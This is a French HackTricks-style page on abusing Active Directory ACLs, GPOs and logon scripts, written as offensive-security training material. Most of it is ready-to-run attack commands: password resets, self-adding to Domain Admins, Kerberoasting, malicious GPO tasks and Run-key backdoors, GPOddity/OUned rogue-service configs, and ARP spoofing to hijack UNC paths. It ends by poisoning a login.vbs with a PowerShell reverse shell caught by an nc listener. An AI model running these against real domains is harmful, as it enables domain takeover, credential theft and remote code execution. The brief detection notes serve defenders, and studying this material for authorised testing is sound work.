# Abuser des ACL/ACE d’Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques présentées dans** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Droits GenericAll sur un utilisateur**

Ce privilège donne à un attaquant le contrôle total d’un compte utilisateur cible. Une fois les droits `GenericAll` confirmés à l’aide de la commande `Get-ObjectAcl`, un attaquant peut :

- **Modifier le mot de passe de la cible** : avec `net user <username> <password> /domain`, l’attaquant peut réinitialiser le mot de passe de l’utilisateur.
- Depuis Linux, vous pouvez faire la même chose via SAMR avec `net rpc` de Samba :<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Si le compte est désactivé, effacez l’indicateur UAC** : `GenericAll` permet de modifier `userAccountControl`. Depuis Linux, BloodyAD peut supprimer l’indicateur `ACCOUNTDISABLE` :<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting** : Attribuer un SPN au compte utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire et tenter de cracker les hashes du ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **ASREPRoasting ciblé** : Désactiver la pré-authentification pour l'utilisateur, rendant son compte vulnérable à l'ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link** : Avec des droits `GenericAll` sur un utilisateur, vous pouvez ajouter un credential basé sur un certificat et vous authentifier en tant que cet utilisateur sans modifier son mot de passe. Voir :

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Droits GenericAll sur un groupe**

Ce privilège permet à un attaquant de manipuler les appartenances aux groupes s’il dispose de droits `GenericAll` sur un groupe tel que `Domain Admins`. Après avoir identifié le nom distinctif du groupe avec `Get-NetGroup`, l’attaquant peut :

- **S’ajouter au groupe Domain Admins** : Cela peut être effectué via des commandes directes ou à l’aide de modules comme Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Depuis Linux, vous pouvez également utiliser BloodyAD pour vous ajouter à des groupes arbitraires lorsque vous disposez de droits GenericAll/Write sur ceux-ci. Si le groupe cible est imbriqué dans « Remote Management Users », vous obtiendrez immédiatement un accès WinRM aux hôtes qui prennent en compte ce groupe :<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write sur Computer/User**

La possession de ces privilèges sur un objet ordinateur ou un compte utilisateur permet :

- **Kerberos Resource-based Constrained Delegation** : permet de prendre le contrôle d’un objet ordinateur.
- **Shadow Credentials** : utiliser cette technique pour usurper l’identité d’un compte ordinateur ou utilisateur en exploitant les privilèges permettant de créer des shadow credentials.

## **WriteProperty sur un groupe**

Si un utilisateur possède des droits `WriteProperty` sur tous les objets d’un groupe spécifique (par ex. `Domain Admins`), il peut :

- **S’ajouter au groupe Domain Admins** : cette opération, réalisable en combinant les commandes `net user` et `Add-NetGroupUser`, permet une élévation de privilèges au sein du domaine.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ce privilège permet aux attackers de s’ajouter eux-mêmes à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui modifient directement l’appartenance aux groupes. La séquence de commandes suivante permet l’auto-ajout :
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Privilège similaire, celui-ci permet aux attaquants de s'ajouter directement à des groupes en modifiant les propriétés de ces groupes s'ils disposent du droit `WriteProperty` sur ces groupes. La confirmation et l'exécution de ce privilège s'effectuent avec :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

La possession de l’`ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser les mots de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent être effectuées via PowerShell ou d’autres outils en ligne de commande, offrant plusieurs méthodes pour réinitialiser le mot de passe d’un utilisateur, notamment des sessions interactives et des one-liners pour les environnements non interactifs. Les commandes vont de simples invocations PowerShell à l’utilisation de `rpcclient` sous Linux, illustrant la polyvalence des vecteurs d’attaque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sur un groupe**

Si un attacker découvre qu'il dispose de droits `WriteOwner` sur un groupe, il peut modifier le propriétaire du groupe pour se définir lui-même comme propriétaire. Cela est particulièrement impactant lorsque le groupe concerné est `Domain Admins`, car la modification du propriétaire permet un contrôle plus étendu des attributs et de l'appartenance au groupe. Le processus consiste à identifier l'objet correct via `Get-ObjectAcl`, puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID, soit par nom.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Cette permission permet à un attaquant de modifier les propriétés d’un utilisateur. Plus précisément, avec un accès `GenericWrite`, l’attaquant peut modifier le chemin du script de connexion d’un utilisateur afin d’exécuter un script malveillant lors de la connexion de l’utilisateur. Pour cela, il utilise la commande `Set-ADObject` afin de mettre à jour la propriété `scriptpath` de l’utilisateur ciblé pour qu’elle pointe vers le script de l’attaquant.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Avec ce privilège, les attaquants peuvent manipuler les membres d’un groupe, notamment en s’ajoutant eux-mêmes ou en ajoutant d’autres utilisateurs à des groupes spécifiques. Ce processus consiste à créer un objet d’identification, à l’utiliser pour ajouter ou supprimer des utilisateurs d’un groupe, puis à vérifier les modifications d’appartenance à l’aide de commandes PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Depuis Linux, Samba `net` peut ajouter/supprimer des membres lorsque vous détenez `GenericWrite` sur le groupe (utile lorsque PowerShell/RSAT ne sont pas disponibles) :<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Le fait de posséder un objet AD et de disposer des privilèges `WriteDACL` sur celui-ci permet à un attaquant de s’accorder lui-même des privilèges `GenericAll` sur l’objet. Cela s’effectue par le biais d’une manipulation ADSI, offrant un contrôle total sur l’objet ainsi que la possibilité de modifier ses appartenances à des groupes. Malgré cela, certaines limitations existent lors de la tentative d’exploitation de ces privilèges à l’aide des cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Prise de contrôle rapide de WriteDACL/WriteOwner (PowerView)

Lorsque vous disposez de `WriteOwner` et `WriteDacl` sur un compte utilisateur ou de service, vous pouvez en prendre le contrôle total et réinitialiser son mot de passe à l’aide de PowerView sans connaître l’ancien mot de passe :
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Remarques :
- Vous devrez peut-être d’abord modifier le propriétaire pour vous-même si vous disposez uniquement de `WriteOwner` :
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valider l'accès avec n'importe quel protocole (SMB/LDAP/RDP/WinRM) après la réinitialisation du mot de passe.

## **Replication on the Domain (DCSync)**

L'attaque DCSync exploite des permissions de réplication spécifiques sur le domaine afin d'imiter un contrôleur de domaine et de synchroniser des données, notamment les identifiants des utilisateurs. Cette technique puissante nécessite des permissions telles que `DS-Replication-Get-Changes`, permettant aux attaquants d'extraire des informations sensibles de l'environnement AD sans accès direct à un contrôleur de domaine.<sup>[[5]](#references)</sup> [**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

L'accès délégué à la gestion des Group Policy Objects (GPO) peut présenter des risques de sécurité importants. Par exemple, si un utilisateur tel que `offense\spotless` dispose de droits de gestion des GPO, il peut avoir des privilèges tels que **WriteProperty**, **WriteDacl** et **WriteOwner**. Ces permissions peuvent être détournées à des fins malveillantes, comme l'a identifié PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Pour identifier les GPO mal configurées, les cmdlets de PowerSploit peuvent être enchaînées. Cela permet de découvrir les GPO qu'un utilisateur spécifique a la permission de gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied** : Il est possible de déterminer à quels ordinateurs une GPO spécifique s'applique, afin de mieux comprendre l'étendue de son impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer** : Pour voir quelles stratégies sont appliquées à un ordinateur particulier, des commandes telles que `Get-DomainGPO` peuvent être utilisées.

**OUs with a Given Policy Applied** : L'identification des unités organisationnelles (OU) affectées par une stratégie donnée peut être effectuée à l'aide de `Get-DomainOU`.

Vous pouvez également utiliser l'outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPO et y trouver des problèmes.

### Abuse GPO - New-GPOImmediateTask

Les GPO mal configurées peuvent être exploitées pour exécuter du code, par exemple en créant une tâche planifiée immédiate. Cela peut être utilisé pour ajouter un utilisateur au groupe des administrateurs locaux sur les machines affectées, ce qui élève considérablement les privilèges :
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Le module GroupPolicy, s'il est installé, permet de créer et de lier de nouveaux GPO, ainsi que de définir des préférences telles que des valeurs de registre pour exécuter des backdoors sur les ordinateurs concernés. Cette méthode nécessite que le GPO soit mis à jour et qu'un utilisateur se connecte à l'ordinateur pour permettre l'exécution :
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abus de GPO

SharpGPOAbuse offre une méthode pour abuser des GPO existantes en ajoutant des tâches ou en modifiant des paramètres sans avoir besoin de créer de nouvelles GPO. Cet outil nécessite de modifier des GPO existantes ou d'utiliser les outils RSAT pour en créer de nouvelles avant d'appliquer les modifications :
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour de la stratégie

Les mises à jour des GPO ont généralement lieu environ toutes les 90 minutes. Pour accélérer ce processus, notamment après avoir appliqué une modification, la commande `gpupdate /force` peut être utilisée sur l'ordinateur cible afin de forcer une mise à jour immédiate de la stratégie. Cette commande garantit que toutes les modifications apportées aux GPO sont appliquées sans attendre le prochain cycle de mise à jour automatique.

### Fonctionnement interne

Après inspection des tâches planifiées associées à une GPO donnée, comme la `Misconfigured Policy`, l'ajout de tâches telles que `evilTask` peut être confirmé. Ces tâches sont créées à l'aide de scripts ou d'outils en ligne de commande visant à modifier le comportement du système ou à élever les privilèges.

La structure de la tâche, telle qu'elle apparaît dans le fichier de configuration XML généré par `New-GPOImmediateTask`, détaille les spécificités de la tâche planifiée, notamment la commande à exécuter et ses déclencheurs. Ce fichier illustre la manière dont les tâches planifiées sont définies et gérées au sein des GPO, offrant une méthode pour exécuter des commandes ou des scripts arbitraires dans le cadre de l'application des stratégies.

### Utilisateurs et groupes

Les GPO permettent également de manipuler les appartenances des utilisateurs et des groupes sur les systèmes cibles. En modifiant directement les fichiers de stratégie Users and Groups, les attackers peuvent ajouter des utilisateurs à des groupes privilégiés, tels que le groupe local `administrators`. Cela est possible grâce à la délégation des permissions de gestion des GPO, qui autorise la modification des fichiers de stratégie afin d'y inclure de nouveaux utilisateurs ou de modifier les appartenances aux groupes.

Le fichier de configuration XML de Users and Groups décrit la manière dont ces modifications sont mises en œuvre. En ajoutant des entrées à ce fichier, des privilèges élevés peuvent être accordés à des utilisateurs spécifiques sur les systèmes concernés. Cette méthode offre une approche directe de l'élévation de privilèges par la manipulation des GPO.

En outre, d'autres méthodes d'exécution de code ou de maintien de la persistence, comme l'utilisation de scripts de logon/logoff, la modification de clés de registre pour les autoruns, l'installation de logiciels via des fichiers .msi ou la modification des configurations de services, peuvent également être envisagées. Ces techniques offrent différentes possibilités de maintenir l'accès et de contrôler les systèmes cibles en exploitant les GPO.

### Rediriger la récupération des GPC/GPT vers des services rogue authentifiés

Une GPO se compose d'un **Group Policy Container (GPC)** LDAP contenant des métadonnées et d'un **Group Policy Template (GPT)** hébergé sur SMB contenant les fichiers de stratégie. Lors de l'actualisation, le client suit le `gPLink` du conteneur, lit le GPC référencé ainsi que son `gPCFileSysPath`, puis télécharge le GPT depuis ce chemin UNC. Par conséquent, un accès en écriture au GPC lui-même ou au `gPLink` d'une OU, d'un Site ou d'un Domain peut être converti en traitement privilégié de stratégies.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Empoisonnement de `gPCFileSysPath` avec GPOddity

Si le principal contrôlé peut écrire dans le GPC cible, directement ou via un **NTLM relay to LDAP**, remplacez `gPCFileSysPath` par un chemin UNC hébergé par l'attaquant. [GPOddity](https://github.com/synacktiv/GPOddity) automatise la modification LDAP et sert un GPT malveillant contenant des fichiers de stratégie basés sur des modules ou une Immediate Task que le client Group Policy exécute sous `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Un partage SMB anonyme ou indépendant des credentials n'est pas suffisant sur les clients Windows actuels : SMB Secure Negotiate exige la preuve que l'authentification a réussi. Le service rogue doit donc valider l'identité du domaine, dériver la clé de session SMB et signer correctement ses réponses. En mode embarqué, configurez GPOddity avec un controlled machine account et sa service key, puis sélectionnez un payload côté ordinateur ou côté utilisateur dans la section `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Cas particulier de GPO utilisateur :** après MS16-072, Windows crée toujours deux sessions SMB2 dans la **même connexion TCP** : la session utilisateur lit `GPT.INI`, puis la session du compte ordinateur lit la configuration effective, comme `ScheduledTasks.xml`. Un rogue server doit donc indexer l’état d’authentification, les clés de session et les clés de signature par `SMB2 SessionId`, et non uniquement par socket. Le fork Scapy intégré à GPOddity/OUned implémente cela via `SMBStreamSocketMultiplexing` et un `SMBServer` prenant en charge le multiplexage ; les serveurs Impacket/Scapy à session unique réutilisent sinon le mauvais état de signature et échouent avec les stratégies utilisateur.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning avec OUned

Avec `WriteGPLink`, `GenericWrite` ou un contrôle équivalent sur une OU, un Site ou un Domain, un attaquant peut ajouter un lien dont le DN du GPC est fourni par un hôte LDAP contrôlé par l’attaquant. Cette primitive a été présentée à l’origine par Petros Koutroumpis ; [OUned](https://github.com/synacktiv/OUned) automatise l’écriture LDAP ainsi que la chaîne GPC/GPT malveillante.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
La victime s’authentifie d’abord auprès du service LDAP rogue et reçoit un GPC dont `gPCFileSysPath` pointe vers le service SMB rogue ; elle s’authentifie ensuite auprès de SMB et applique le GPT fourni. OUned nécessite donc un compte avec un SPN LDAP, un compte machine avec un SPN HOST pour SMB (le même compte machine peut satisfaire les deux conditions), ainsi qu’une résolution DNS ou une redirection inverse qui achemine les ports 389 et 445 vers l’hôte de l’opérateur.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
Le serveur LDAP Scapy intégré d’OUned valide Kerberos/SPNEGO avec la véritable clé du service contrôlé et sert des données GPC arbitraires depuis un fichier JSON. La clé JSON vide modélise rootDSE, les préfixes `base64:` représentent des valeurs binaires, et le serveur prend en charge les opérations add/delete/modify/search ainsi que les recherches `BASE`, `LEVEL` et `SUBTREE` ; il peut négocier l’absence de protection, l’intégrité ou la confidentialité. Cela rend le service réutilisable lorsqu’un autre composant Windows suit une référence LDAP contrôlée par l’attaquant, tout en exigeant un LDAP authentifié.<sup>[[15]](#references)</sup>

Ne supposez pas que la synchronisation du mot de passe d’un compte dans un domaine factice reproduit toutes les clés Kerberos : RC4 est dérivé du mot de passe, tandis que le mécanisme AES string-to-key utilise également un sel dérivé du nom d’hôte/domaine du principal. Fournir la véritable clé AES du compte à `KerberosSSP` évite de forcer l’utilisation de RC4 via une modification détectable de `msDS-SupportedEncryptionTypes`, attribut auto-modifiable du compte machine.<sup>[[15]](#references)</sup>

#### Pivots de détection

Corrélez les modifications de `gPCFileSysPath` ou `gPLink` avec les changements de version des GPO et les nouveaux fichiers XML Immediate/Scheduled Task. Examinez les liens vers des contextes de nommage inattendus, les hôtes UNC situés en dehors de l’ensemble approuvé de DC/SYSVOL, les enregistrements DNS redirigeant les noms de comptes machine, les tickets de service LDAP/CIFS pour des comptes machine inhabituels, ainsi que les modifications de `msDS-SupportedEncryptionTypes` activant RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` sur une OU/un domaine vous permet de modifier l’attribut `gPLink` du conteneur cible et de **forcer l’application d’un GPO existant** sans modifier le GPO lui-même. Cela devient intéressant lorsque le GPO lié référence déjà du contenu distant via des **chemins UNC** (`\\HOST\share\...`), car les utilisateurs authentifiés peuvent lire **SYSVOL** et rechercher hors ligne des stratégies réutilisables.<sup>[[11]](#references)</sup>

Workflow de haut niveau :

1. Utilisez BloodHound pour identifier un principal disposant de `WriteGPLink` sur une OU et énumérer les ordinateurs/utilisateurs présents dans cette OU.
2. Clonez `SYSVOL` en lecture seule et analysez les GPO à la recherche de **l’installation de logiciels**, de **mappages de lecteurs** (`Drives.xml`) et de **scripts d’ouverture de session/de démarrage** qui référencent des chemins UNC.
3. Privilégiez les stratégies pointant vers un **nom d’hôte direct** (par exemple `\\DC02\share\pkg.msi`) plutôt que vers des chemins DFS/namespace de domaine, car les chemins basés sur un nom d’hôte sont plus faciles à rediriger avec du L2 spoofing.
4. Ajoutez le GUID du GPO choisi au `gPLink` de l’OU cible afin que la victime traite cette stratégie déjà existante.
5. Sur le même domaine de broadcast, effectuez un ARP spoofing de l’hôte UNC et liez son IP localement (`ip addr add <target_ip>/32 dev <iface>`) afin que le trafic SMB de la victime atteigne votre hôte.
6. Servez le chemin/nom de fichier attendu depuis un serveur SMB contrôlé par l’attaquant (par exemple `smbserver.py`) et attendez le traitement normal des stratégies.

Exemple de collecte de `SYSVOL` et de corrélation des GPO :
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Liez le GPO existant à l’OU cible :
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Si la GPO liée déploie un MSI depuis un chemin UNC, le client le récupérera au **démarrage de l’ordinateur** et l’installera sous **`NT AUTHORITY\SYSTEM`**. En usurpant l’hôte référencé et en fournissant un MSI malveillant sous le **même partage/chemin/nom**, vous pouvez transformer `WriteGPLink` en exécution de code SYSTEM **sans modifier SYSVOL**.

Contraintes importantes :

- **Le timing est important** : le nouveau lien est pris en compte lors de l’actualisation de la stratégie (généralement après environ 90 minutes), mais **Software Installation** se déclenche généralement au **redémarrage**.
- Windows Installer suit généralement le déploiement à l’aide du **`ProductCode`** du package. Si le produit est déjà installé, le déploiement peut être ignoré.
- Pour éviter le rejet par l’installer, patchez le MSI rogue afin que son **`ProductCode`** et son **`PackageCode`** correspondent à ceux du package légitime attendu par la GPO.
- D’anciens fichiers d’annonce `.aas` peuvent rester dans `SYSVOL`. Vérifiez donc que le déploiement semble toujours actif avant de vous y fier.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Détournement UNC de mappage de lecteur -> capture NTLM / relais WebDAV

Les mappages de lecteurs GPP dans `Drives.xml` amènent les utilisateurs à s'authentifier auprès du chemin UNC configuré lors de la connexion ou de la reconnexion. Si vous usurpez l'hôte référencé, vous pouvez capturer du **NetNTLMv2**. Si SMB est délibérément rendu indisponible, Windows peut réessayer via **WebDAV**, en envoyant du **NTLM over HTTP**, ce qui est bien plus flexible pour les relais vers **LDAP(S)**, **AD CS** ou **SMB**.

#### Détournement UNC de script de connexion/démarrage

Le même principe s'applique aux scripts hébergés sur UNC découverts dans `SYSVOL` :

- Les **scripts de connexion** s'exécutent généralement dans le contexte de l'**utilisateur**.
- Les **scripts de démarrage** s'exécutent généralement dans le contexte de l'**ordinateur / SYSTEM**.

Si le chemin du script pointe vers un nom d'hôte usurpable, redirigez l'hôte UNC et servez le contenu du script de remplacement depuis l'emplacement attendu.

## Empoisonnement des scripts de connexion SYSVOL/NETLOGON

Les chemins accessibles en écriture sous `\\<dc>\SYSVOL\<domain>\scripts\` ou `\\<dc>\NETLOGON\` permettent de falsifier les scripts de connexion exécutés lors de la connexion des utilisateurs via GPO. Cela permet l'exécution de code dans le contexte de sécurité des utilisateurs qui se connectent.

### Localiser les scripts de connexion
- Inspecter les attributs des utilisateurs pour trouver un script de connexion configuré :
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Parcourir les partages du domaine pour trouver des raccourcis ou des références à des scripts :
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analyser les fichiers `.lnk` pour résoudre les cibles pointant vers SYSVOL/NETLOGON (astuce DFIR utile et pour les attackers sans accès direct aux GPO)
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound affiche l’attribut `logonScript` (`scriptPath`) sur les nœuds utilisateur lorsqu’il est présent.

### Valider l’accès en écriture (ne faites pas confiance aux listings des partages)
Les outils automatisés peuvent indiquer que SYSVOL/NETLOGON est en lecture seule, mais les ACL NTFS sous-jacentes peuvent tout de même autoriser les écritures. Testez toujours :
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Si la taille du fichier ou le mtime change, vous avez le write. Préservez les originaux avant toute modification.

### Empoisonner un script de logon VBScript pour le RCE
Ajoutez une commande qui lance un reverse shell PowerShell (générez-le depuis revshells.com) et conservez la logique d’origine pour éviter de perturber la fonction métier :
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Écoutez sur votre hôte et attendez la prochaine connexion interactive :
```bash
rlwrap -cAr nc -lnvp 443
```
Notes :
- L’exécution s’effectue avec le jeton de l’utilisateur qui a ouvert la session (et non SYSTEM). La portée correspond au lien GPO (OU, site, domaine) qui applique ce script.
- Nettoyez en restaurant le contenu et les horodatages d’origine après utilisation.


## References

- [1] [Abus des ACL/ACE Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Comptes privilégiés et privilèges de jeton](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Mise à jour des chemins d’attaque ACL](https://wald0.com/?p=112)
- [4] [Énumération ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Élévation de privilèges avec des ACL dans Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Analyse des privilèges et des comptes privilégiés Active Directory](https://adsecurity.org/?p=3658)
- [7] [Constructeur ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – opérations sur les attributs/UAC AD depuis Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (appartenance à un groupe)](https://www.samba.org/)
- [10] [HTB Puppy : abus des ACL AD, cassage d’Argon2 KeePassXC et déchiffrement DPAPI jusqu’aux droits d’administrateur du DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out : détournement des chemins UNC des GPO pour l’exécution de code et le relais NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity : exploitation des GPO Active Directory via le relais NTLM, et plus encore](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
